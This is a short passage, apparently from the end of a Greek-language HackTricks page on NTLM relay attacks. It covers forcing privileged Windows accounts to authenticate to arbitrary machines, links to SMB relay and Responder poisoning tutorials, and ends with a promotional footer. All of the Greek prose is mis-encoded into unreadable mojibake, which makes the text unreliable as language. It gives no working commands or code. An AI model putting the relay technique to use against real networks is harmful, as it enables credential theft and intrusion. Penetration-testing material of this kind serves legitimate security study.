Î‘Ï…Ï„Î¬ Ï„Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÎºÎ±Î¹ Î¿Î¹ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ ÏƒÏ‡Î·Î¼Î±Ï„Î¯Î¶Î¿Ï…Î½ Î­Î½Î± Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¼Î­Î½Î¿ ÏƒÏÎ½Î¿Î»Î¿ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÏ€Î¹Î¸Î­ÏƒÎµÏ‰Î½ NTLM Relay ÏƒÎµ Î´Î¹Î¬Ï†Î¿ÏÎ± Î´Î¯ÎºÏ„Ï…Î±.

### Î•Î¾Î±Î½Î±Î³ÎºÎ±ÏƒÎ¼ÏŒÏ‚ NTLM Î£Ï…Î½Î´Î­ÏƒÎµÏ‰Î½

Î£Ï„Î± Windows, **Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± ÎµÎ¾Î±Î½Î±Î³ÎºÎ¬ÏƒÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î¿Ï…Ï‚ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿Ï…Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Î½Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ ÏƒÎµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ Î¼Î·Ï‡Î±Î½Î­Ï‚**. Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ»Î¯Î´Î± Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÏÏ‚:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
